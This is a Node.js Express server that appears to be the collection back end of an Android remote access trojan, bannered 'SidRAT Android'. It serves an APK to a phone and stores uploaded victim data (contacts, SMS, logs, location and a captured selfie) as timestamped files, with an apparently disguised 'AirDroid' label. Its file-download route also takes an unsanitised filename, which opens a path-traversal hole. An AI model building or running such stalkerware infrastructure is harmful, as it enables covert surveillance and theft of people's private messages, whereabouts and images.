const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

// INCREASE LIMIT: Photos are large, so we set this to 50mb
app.use(express.json({ limit: '50mb' }));

const art = `
 _________.__    ._____________    ________________
/    _____/|__| __| _/\\______   \\  /  _  \\__    ___/
\\_____  \\ |  |/ __ |  |       _/ /  /_\\  \\|    |   
/        \\|  / /_/ |  |    |   \\/    |    \\    |   
/_______  /|__\\____ |  |____|_  /\\____|__  /____|   
        \\/          \\/          \\/          \\/          
    _____              .___              .__    .___  
   /  _  \\    ____    __| _/______  ____ |__| __| _/  
  /  /_\\  \\ /    \\  / __ |\\_  __ \\/  _ \\|  |/ __ |   
 /    |    \\    |  \\/ /_/ | |  | \\(  <_> )  / /_/ |   
 \\____|__  /___|  /\\____ | |__|   \\____/|__\\____ |   
         \\/     \\/      \\/                     \\/    
`;

// ROUTE 1: Download the APK
app.get('/download/:filename', (req, res) => {
    const fileName = req.params.filename;
    const filePath = path.join(__dirname, fileName);

    if (fs.existsSync(filePath)) {
        res.download(filePath); 
    } else {
        console.error(`Error: File not found at ${filePath}`);
        res.status(404).send("File not found on server.");
    }
});

// ROUTE 2: Receive Data from AirDroid
app.post('/upload', (req, res) => {
    const now = new Date();
    // Create timestamp for filenames: YYYY-MM-DD_HH-MM-SS
    const ts = `${now.getFullYear()}-${now.getMonth()+1}-${now.getDate()}_${now.getHours()}-${now.getMinutes()}-${now.getSeconds()}`;
    
    // 1. Save Text Data (Contacts, Logs, SMS, Location)
    const textData = `Data Captured at: ${ts}\n\n` + JSON.stringify(req.body, null, 2);
    fs.writeFileSync(path.join(__dirname, `Data_${ts}.txt`), textData);

    // 2. Save Selfie (if it exists)
    if (req.body.selfie && req.body.selfie.length > 0) {
        // Convert Base64 string back into a real image file
        const imageBuffer = Buffer.from(req.body.selfie, 'base64');
        fs.writeFileSync(path.join(__dirname, `Selfie_${ts}.jpg`), imageBuffer);
        console.log(`[${ts}] Selfie Captured and Saved!`);
    }

    console.log(`[${ts}] Full Data Logged Successfully.`);
    res.status(200).send("Sync Complete");
});

app.listen(3000, '0.0.0.0', () => {
    console.log(art);
    console.log("--------------------------------------------------");
    console.log("SERVER ONLINE: Listening on Port 3000");
    console.log("Connect Phone to: http://YOUR_PC_IP:3000/download/app-debug.apk");
    console.log("--------------------------------------------------");
});